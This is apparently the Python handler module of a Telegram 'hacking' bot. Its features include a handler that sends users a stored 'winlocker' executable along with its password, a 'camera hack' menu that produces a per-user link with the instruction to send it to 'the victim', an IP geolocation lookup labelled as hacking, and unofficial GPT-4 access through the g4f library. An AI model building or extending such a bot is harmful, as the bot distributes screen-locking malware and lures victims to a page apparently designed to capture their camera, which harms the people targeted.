import requests
from g4f.client import Client
from middleware import check_subscription_decorator, rate_limit_decorator
from create_bot import bot
from telebot import types
from handlers.start_handler import main
from handlers.state import UserState
import os
# from keep_alive import keep_alive
# keep_alive()

client = Client()



# back handler
@bot.callback_query_handler(func=lambda call: call.data == 'back')
def back_callback(call):
    main(call.message)



# hendler for send winlocker
@bot.callback_query_handler(func=lambda call: call.data == 'winlocker')
@rate_limit_decorator(delay=5)
def handle_storage(call):
    winlocker = open("./storage/config.exe","rb")
    bot.send_document(call.message.chat.id, winlocker)
    bot.send_message(call.message.chat.id, 'password: 7788')
    




# web screen handler --todo
@bot.callback_query_handler(func=lambda call: call.data == 'accountHack')
@check_subscription_decorator
@rate_limit_decorator(delay=5)
def accountHacking(call): 
    markup = types.InlineKeyboardMarkup(row_width=1)
    item_1 = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(item_1)

    img = open('./img/main.jpeg', 'rb')
    caption_text = "Coming soon"

    media = types.InputMediaPhoto(media=img, caption=caption_text)
    bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
    img.close()



# ip addres hack func

def location(message, ip):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item_1 = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(item_1)

    try:
        bot.send_message(message.chat.id, 'Please wait')
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
    except ConnectionError:
        bot.send_message(message.chat.id, 'Error', reply_markup=markup)

    if response.status_code == 404:
        bot.send_message(message.chat.id, "Oops")
        return

    result = response.json()
    if result["status"] == "fail":
        markup = types.InlineKeyboardMarkup(row_width=1)
        item_1 = types.InlineKeyboardButton('Main menu', callback_data='back')
        markup.add(item_1)
        
        bot.send_message(message.chat.id, "ERROR. enter a correct IP address", reply_markup=markup)
        return


    result_message = f"""
> *Country:* \\ {result['country']}\\
> *Country Code:* \\ {result['countryCode']}\\
> *Region:* \\ {result['region']}\\
> *Region Name:* \\ {result['regionName']}\\
> *City:* \\ {result['city']}\\
> *Timezone:* \\ {result['timezone']}\\
> *ISP:* \\ {result['isp']}\\
> *as:* \\ {result['as']}\\
    """
    
    bot.send_location(message.chat.id, result['lat'], result['lon'])
    bot.send_message(message.chat.id, f"{result_message}", parse_mode='MarkdownV2', reply_markup=markup)
    
    return tuple(result_message)


# ip hack menu handler
@bot.callback_query_handler(func=lambda call: call.data == 'ipHack')
@check_subscription_decorator
@rate_limit_decorator(delay=5)
def ipHacking(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item_1 = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(item_1)

    img = open('./img/main.jpeg', 'rb')
    caption_text = "Send me IP address."

    media = types.InputMediaPhoto(media=img, caption=caption_text)
    bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
    img.close()

    UserState.waiting_for_ip[call.message.chat.id] = True


# handle hack ip handler 
@bot.message_handler(func=lambda message: UserState.waiting_for_ip.get(message.chat.id))
def get_ip_address(message):
    ip = message.text
    if ip:
        markup = types.InlineKeyboardMarkup(row_width=1)
        item_1 = types.InlineKeyboardButton('Main menu', callback_data='back')
        markup.add(item_1)
        
        
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ru")
        result = response.json()        
        if response.status_code == 404 or result.get("status") == "fail":
            bot.send_message(message.chat.id, "> ERROR\\. enter a correct IP address\\.", reply_markup=markup, parse_mode='MarkdownV2')
            return

        location(message, ip)



# camera hack menu handler
@bot.callback_query_handler(func=lambda call: call.data == 'cameraHack')
@check_subscription_decorator
def camera_hacking_callback(call):

    markup = types.InlineKeyboardMarkup(row_width=2)
    item_1 = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(item_1)

    img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы хакинга камеры
    link = f"https://super-game-bot.netlify.app/g/{call.message.chat.id}"
    caption_text = f"Copy the link and send it to the victim\n\n🔗Link: {link}"
    
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=media, reply_markup=markup)
    img.close()







# gpt---------------------------------------------------
@bot.callback_query_handler(func=lambda call: call.data == 'back')
def back_callback(call):
    if 'main' in UserState.user_data.get(call.message.chat.id, {}):
        # Если пользователь находится в главном меню, то просто отправляем ему главное меню
        main(call.message)
    elif 'gpt4' in UserState.user_data.get(call.message.chat.id, {}):
        # Если пользователь находится в диалоге с GPT-4, то завершаем диалог и отправляем в главное меню
        del UserState.user_data[call.message.chat.id]['gpt4']  # Удаляем информацию о диалоге с GPT-4
        main(call.message)

# gpt 4 
@bot.callback_query_handler(func=lambda call: call.data == 'gpt4')
def gpt4_callback(call):
    if call.message.chat.id not in UserState.user_data:
        UserState.user_data[call.message.chat.id] = {}
    UserState.user_data[call.message.chat.id]['gpt4'] = True
    markup = types.InlineKeyboardMarkup()
    back_button = types.InlineKeyboardButton('Back', callback_data='back')
    markup.add(back_button)
    if call.message.text:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="You are in dialogue with ChatGPT 4. Send your request in text format.", reply_markup=markup)
    else:
        img = open('./img/main.jpeg', 'rb')  # Путь к изображению для страницы c 
        caption = """
You are in dialogue with ChatGPT 4\\. Send your request in text format\\.
> Press\\ __Back__\\ to exit\\.
"""

        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=caption, reply_markup=markup, parse_mode="MarkdownV2")

        img.close()

# gpt send response handler
@bot.message_handler(func=lambda message: UserState.user_data.get(message.chat.id, {}).get('gpt4', False))
def handle_gpt_requests(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    item = types.InlineKeyboardButton('CHAT GPT 4', callback_data='gpt4')
    markup.add(item)
    
    if UserState.waiting_for_ip[message.chat.id]:
        bot.send_message(message.chat.id, 'IP adres expected. Please try it later.', reply_markup=markup)
        UserState.waiting_for_ip[message.chat.id] = False

    else:
        
        bot.send_chat_action(message.chat.id, 'typing')
        try:
            response = client.chat.completions.create(
                model="gpt-4",
                messages=[{"role": "user", "content": message.text}],
            )
            textResponse = response.choices[0].message.content
            bot.send_chat_action(message.chat.id, 'typing')
            bot.send_message(message.chat.id, textResponse) 
        
        except Exception as e:
            text = f"> Sorry\\ at the moment the server \\can't send the request"
            bot.send_message(
                message.chat.id,
                text,  # Экранированный текст
                parse_mode="MarkdownV2"
            )
            bot.send_message(message.chat.id, e)

        bot.send_chat_action(message.chat.id, 'typing')


# Запуск бота
